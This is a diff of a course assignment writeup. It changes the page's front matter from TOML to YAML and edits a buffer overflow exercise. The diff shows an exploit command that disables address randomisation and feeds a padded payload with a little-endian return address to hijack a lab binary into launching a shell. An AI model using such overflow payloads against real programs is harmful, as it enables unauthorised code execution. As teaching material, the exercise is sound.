@@ -1,20 +1,15 @@
-+++
-title = "Writeup for assignment 4"
-date = 2020-06-03
-summary = "Solutions and explanations for assignment 4"
-
-draft = true
-toc = true
-type = "book"
-
-highlight = true
-highlight_languages = ["c", "makefile", "shell", "plaintext"]
-
-authors= [
-"thom"
-]
-
-+++
+---
+title: "Writeup for assignment 4"
+date: 2020-06-03
+summary: "Solutions and explanations for assignment 4"
+draft: true
+toc: true
+type: "docs"
+highlight: true
+highlight_languages: ["c", "makefile", "shell", "plaintext"]
+authors:
+  - me
+---
 
 This writeup was contributed by Denisa and Ischa.
 
@@ -343,7 +338,7 @@ setarch $(uname -m) -R ./functions $(perl -e 'print "A"x120 . "\xe4\x48\x55\x55\
 ```
 We supply the address in `little-endian` format, which is how all values, including pointers are stored. The program launches a shell:
 ```
-* [DEBUG] Your input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�HUUUU
+* [DEBUG] Your input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHUUUU
 * [DEBUG] The function launch_shell is at 0x5555555548e4
 Launching shell.
 ```
